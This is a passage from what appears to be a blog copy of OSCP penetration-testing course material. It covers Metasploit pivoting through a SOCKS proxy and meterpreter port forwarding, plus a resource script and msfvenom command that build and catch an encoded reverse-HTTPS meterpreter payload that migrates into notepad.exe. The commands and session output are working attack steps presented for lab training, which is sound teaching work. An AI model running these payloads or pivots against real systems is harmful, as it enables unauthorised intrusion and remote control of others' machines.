[*] Auxiliary module running as background job 0.
[*] Starting the socks4a proxy server


 We can now update our Proxy Chains configuration file (/etc/proxychains.conf) to take advantage of the SOCKS proxy.
 
 This is done by adding a configuration line as shown in Listing 810 below.

kali@kali:~$ sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf


Finally, we can use proxychains to run an application like rdesktop to obtain GUI access from our Kali Linux system to the domain controller on the internal network.

kali@kali:~$ sudo proxychains rdesktop 192.168.1.110

ProxyChains-3.1 (http://proxychains.sf.net)
Autoselected keyboard map en-us
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.110:3389-<><>-OK
ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.110:3389-<><>-OK
Connection established using SSL.
WARNING: Remote desktop does not support colour depth 24; falling back to 16


Next, the rdesktop client opens and allows us to log in to the domain controller as shown in Figure315:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/27.jpg)

 We can also use a similar technique for port forwarding using the portfwd command from inside a meterpreter session, which will forward a specific port to the internal network.

meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
 -L <opt> Forward: local host to listen on (optional). Reverse: local host to conn
 -R Indicates a reverse port forward.
 -h Help banner.
 -i <opt> Index of the port forward entry to interact with (see the "list" command
 -l <opt> Forward: local port to listen on. Reverse: local port to connect to.
 -p <opt> Forward: remote port to connect to. Reverse: remote port to listen on.
 -r <opt> Forward: remote host to connect to.
 

 We can create a port forward from localhost port 3389 to port 3389 on the compromised host(192.168.1.110) as shown in Listing 813.

meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.110
[*] Local TCP relay created: :3389 <-> 192.168.1.110:3389



 Let’s test this by connecting to 127.0.0.1:3389 through rdesktop to access the compromised hostin the internal network.

kali@kali:~$ rdesktop 127.0.0.1

Autoselected keyboard map en-us
ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized?
Connection established using SSL.
WARNING: Remote desktop does not support colour depth 24; falling back to 16


 Using this technique, we are able to gain a remote desktop session on a host we are otherwise notable to reach from our Kali system. 
 
 Likewise, if the domain controller was connected to an additional network, we could create a chain of pivots to reach any host.
22.5.4.1 Exercise

1. Use post-exploitation modules and extensions along with pivoting techniques to enumerateand compromise the domain controller from a meterpreter shell obtained from yourWindows 10 client.
22.6 Metasploit Automation


 While the Metasploit Framework automates quite a bit for us, we can further automate repetitive commands inside the framework itself.

 When we use a payload to create a standalone executable or a client-side attack vector like an HTML application, we select options like payload type, local host, and local port. 
 
 The same options must then be set in the multi/handler module.
 
 To streamline this, we can take advantage of Metasploit resource scripts.
 
 We can use any number of Metasploit commands in a resource script.

 For example, using a standard editor, we will create a script in our home directory named setup.rc.
 
 In this script, we will set the payload to windows/meterpreter/reverse_https and configure the relevant LHOST and LPORT parameters. 
 
 We also enable stage encoding using thex86/shikata_ga_nai encoder and configure the post/windows/manage/migrate module to be executed automatically using the AutoRunScript option.
 
 This will cause the spawned meterpreter to automatically launch a background notepad.exe process and migrate to it. 
 
 Finally, the ExitOnSession parameter is set to “false” to ensure that the listener keeps accepting new connections and the module is executed with the -j and -z flags to stop us from automatically interacting with the session. 
 
 The commands for this are as follows:

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.11.0.4
set LPORT 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
exploit -j -z



 After saving the script, we can execute it by passing the -r flag to msfconsole as shown in Listing.
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/28.jpg)

kali@kali:~$ sudo msfconsole -r setup.rc
...
[*] Processing setup.rc for ERB directives.
resource (setup.rc)> use exploit/multi/handler

resource (setup.rc)> set PAYLOAD windows/meterpreter/reverse_https

PAYLOAD => windows/meterpreter/reverse_https

resource (setup.rc)> set LHOST 10.11.0.4

LHOST => 10.11.0.4

resource (setup.rc)> set LPORT 443

LPORT => 443

resource (setup.rc)> set EnableStageEncoding true

EnableStageEncoding => true

resource (setup.rc)> set StageEncoder x86/shikata_ga_nai

StageEncoder => x86/shikata_ga_nai

resource (setup.rc)> set AutoRunScript post/windows/manage/migrate

AutoRunScript => post/windows/manage/migrate

resource (setup.rc)> set ExitOnSession false

ExitOnSession => false

resource (setup.rc)> exploit -j -z

[*] Exploit running as background job 0.

msf5 exploit(multi/handler) >

[*] Started HTTPS reverse handler on https://10.11.0.4:443


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/29.jpg)



-j , -z = automatically interacting with the session.

With the listener configured and running, we can, for example, launch an executable containing a meterpreter payload from our Windows VM.

 We can create this executable with msfvenom:

kali@kali:~$ msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.4 LPORT=443
-f exe -o met.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 589 bytes
Final size of exe file: 73802 bytes
Saved as: met.exe


When executed, our multi/handler accepts the connection:

[*] https://10.11.0.4:443 request from 10.11.0.22; Encoded stage with shikata_ga_nai
[*] https://10.11.0.4:443 request from 10.11.0.22; Staging x86 payload (180854 bytes)
[*] Meterpreter session 1 opened (10.11.0.4:443 -> 10.11.0.22:49783)
[*] Session ID 1 (10.11.0.4:443 -> 10.11.0.22:49783) processing AutoRunScript 'post/wi
ndows/manage/migrate'
[*] Running module against CLIENT251
[*] Current server process: test.exe (7520)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 4724
[+] Successfully migrated to process 4724



The session was spawned using an encoded second stage payload and successfully migrated automatically into the notepad.exe process.
22.6.1.1 Exercise

22.6.1.1 Exercise

1. Create a resource script using both a second stage encoder and autorun scripts and use itwith the meterpreter payload.